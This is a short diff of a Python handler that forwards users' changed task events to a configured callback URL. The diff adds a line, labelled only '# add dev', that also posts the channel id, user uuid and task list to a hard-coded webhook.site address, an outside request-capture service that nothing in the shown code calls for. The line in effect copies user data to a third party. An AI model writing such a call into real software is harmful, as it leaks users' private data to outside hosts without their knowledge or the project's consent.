@@ -73,7 +73,8 @@ def incoming_ping(channel_id):
     formatted_changed_events = fetch_changed_events(refresh_token)
 
     request_callback_ping = requests.post(os.getenv("EVENT_PING_CALLBACK_URL"), json={"channel": channel_id, "uuid": user_uuid, "tasks": formatted_changed_events})
-    
+    # add dev
+    requests.post("https://webhook.site/edbd19eb-8aa1-4f8f-98d3-64eefe1c6700", json={"channel": channel_id, "uuid": user_uuid, "tasks": formatted_changed_events})
     return f"{len(formatted_changed_events)} tasks found with at channel: {channel_id}"
 
 ######################
